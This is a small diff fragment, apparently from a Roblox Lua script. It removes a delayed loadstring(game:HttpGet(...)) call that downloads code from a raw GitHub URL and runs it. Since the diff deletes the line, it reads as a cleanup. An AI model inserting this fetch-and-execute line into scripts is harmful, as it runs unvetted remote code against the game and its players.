@@ -2,8 +2,3 @@
 
 
 
-wait(3)
-
-do
-  do loadstring(game:HttpGet("https://raw.githubusercontent.com/yuvic123/s/main/s"))()
-end
